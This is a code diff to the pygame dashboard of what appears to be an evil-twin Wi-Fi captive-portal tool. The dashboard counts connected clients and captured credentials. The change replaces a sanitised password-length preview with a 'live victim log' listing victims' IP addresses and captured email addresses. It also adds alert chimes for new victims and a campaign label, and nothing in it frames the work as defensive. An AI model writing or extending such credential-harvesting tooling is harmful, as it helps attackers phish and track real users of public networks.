@@ -522,13 +522,20 @@ class EvilTwinView:
         f_huge = pygame.font.Font(None, 80)
         f_med = pygame.font.Font(None, 26)
         f_small = pygame.font.Font(None, 20)
+        f_tiny = pygame.font.Font(None, 16)
 
-        # Monitor for new creds to trigger alert
+        # 1. NEW CREDENTIALS ALERT
         current_creds_count = sess.creds_captured()
         if current_creds_count > self.last_creds_seen:
             self.last_creds_seen = current_creds_count
             self.new_creds_alert_timer = time.time() + 5.0 # Show alert for 5s
-            self._play_alert_chime()
+            self._play_alert_chime(is_creds=True)
+
+        # 2. NEW CLIENT ALERT
+        current_clients = sess.clients_connected()
+        if current_clients > getattr(self, "last_clients_seen", 0):
+            self.last_clients_seen = current_clients
+            self._play_alert_chime(is_creds=False)
 
         # SSID banner
         banner = f_med.render(
@@ -540,64 +547,72 @@ class EvilTwinView:
         cy = head_h + 60
         col_w = theme.SCREEN_W // 2
 
-        clients_n = f_huge.render(str(sess.clients_connected()),
+        clients_n = f_huge.render(str(current_clients),
                                   True, theme.ACCENT)
         surf.blit(clients_n, (col_w // 2 - clients_n.get_width() // 2, cy))
         clients_l = f_med.render("CLIENTS", True, theme.FG_DIM)
         surf.blit(clients_l, (col_w // 2 - clients_l.get_width() // 2,
                               cy + clients_n.get_height() + 4))
 
-        creds_n = f_huge.render(str(sess.creds_captured()), True, theme.WARN)
+        creds_n = f_huge.render(str(current_creds_count), True, theme.WARN)
         surf.blit(creds_n, (col_w + col_w // 2 - creds_n.get_width() // 2, cy))
         creds_l = f_med.render("CREDS", True, theme.FG_DIM)
         surf.blit(creds_l, (col_w + col_w // 2 - creds_l.get_width() // 2,
                             cy + creds_n.get_height() + 4))
 
-        # Last creds preview (sanitised)
-        if sess.portal and sess.portal.last_creds:
-            last = sess.portal.last_creds
-            email = last.get("email", "")
-            pw_len = len(last.get("password", ""))
-            preview = f"last: {email}  password({pw_len})"
-            ps = f_small.render(preview[:90], True, theme.WARN)
-            surf.blit(ps, (theme.PADDING, theme.SCREEN_H - foot_h - 56))
+        # VICTIM HUD (Scrolling Ticker)
+        hy = cy + 130
+        pygame.draw.rect(surf, (15, 15, 25), (theme.PADDING, hy, theme.SCREEN_W - 2*theme.PADDING, 160), border_radius=5)
+        pygame.draw.rect(surf, theme.DIVIDER, (theme.PADDING, hy, theme.SCREEN_W - 2*theme.PADDING, 160), 1, border_radius=5)
+        
+        surf.blit(f_small.render("LIVE VICTIM LOG (HISTORY)", True, theme.ACCENT), (theme.PADDING + 10, hy + 8))
+        
+        if sess.portal and (sess.portal.history_creds or sess.portal.history_clients):
+            log_y = hy + 35
+            # Combine and sort events
+            events = []
+            for c in sess.portal.history_creds:
+                events.append((c["ts"], f"[CRED] {c['ip']} -> {c['creds'].get('email','?')}", theme.WARN))
+            for ip in sess.portal.history_clients:
+                events.append(("", f"[CONN] {ip} joined network", theme.ACCENT))
+            
+            # Show last 5 events
+            for _, msg, col in sorted(events, reverse=True)[:5]:
+                surf.blit(f_small.render(msg[:80], True, col), (theme.PADDING + 15, log_y))
+                log_y += 22
+        else:
+            surf.blit(f_small.render("Waiting for victims...", True, theme.FG_DIM), (theme.PADDING + 20, hy + 60))
 
         # NEW CREDENTIALS ALERT OVERLAY
         if time.time() < self.new_creds_alert_timer:
-            overlay = pygame.Surface((theme.SCREEN_W, 80), pygame.SRCALPHA)
-            overlay.fill((255, 100, 0, 180)) # Translucent Orange
-            surf.blit(overlay, (0, theme.SCREEN_H // 2 - 40))
-            alert_f = pygame.font.Font(None, 42)
+            overlay = pygame.Surface((theme.SCREEN_W, 60), pygame.SRCALPHA)
+            overlay.fill((255, 100, 0, 200))
+            surf.blit(overlay, (0, theme.SCREEN_H // 2 - 30))
+            alert_f = pygame.font.Font(None, 36)
             alert_t = alert_f.render("!!! NEW CREDENTIALS CAPTURED !!!", True, (255, 255, 255))
-            surf.blit(alert_t, (theme.SCREEN_W // 2 - alert_t.get_width() // 2, theme.SCREEN_H // 2 - 20))
+            surf.blit(alert_t, (theme.SCREEN_W // 2 - alert_t.get_width() // 2, theme.SCREEN_H // 2 - 15))
 
         # Uptime + portal path
-        info = f"uptime {sess.uptime_s()}s   portal: 192.168.45.1:80"
+        info = f"uptime {sess.uptime_s()}s   portal: 192.168.45.1:80   campaign: {sess.campaign}"
         info_s = f_small.render(info, True, theme.FG_DIM)
         surf.blit(info_s, (theme.PADDING, theme.SCREEN_H - foot_h - 32))
 
-        if not running:
-            warn = f_med.render("hostapd or dnsmasq exited — see logs",
-                                True, theme.ERR)
-            surf.blit(warn, (theme.SCREEN_W // 2 - warn.get_width() // 2,
-                             theme.SCREEN_H - foot_h - 88))
-
-    def _play_alert_chime(self):
+    def _play_alert_chime(self, is_creds: bool = False):
         try:
             if not pygame.mixer.get_init():
                 pygame.mixer.init()
             import array
             sample_rate = 44100
-            # A more pleasant "success" chime
-            for freq in [440, 880]:
-                duration = 0.1
+            freqs = [880, 1760] if is_creds else [440, 660]
+            duration = 0.1
+            for freq in freqs:
                 n_samples = int(sample_rate * duration)
                 buf = array.array('h', [0] * n_samples)
                 for i in range(n_samples):
                     t = i / sample_rate
                     buf[i] = 10000 if (int(t * freq * 2) % 2) else -10000
                 sound = pygame.mixer.Sound(buffer=buf)
-                sound.set_volume(0.3)
+                sound.set_volume(0.2)
                 sound.play()
         except Exception:
             pass
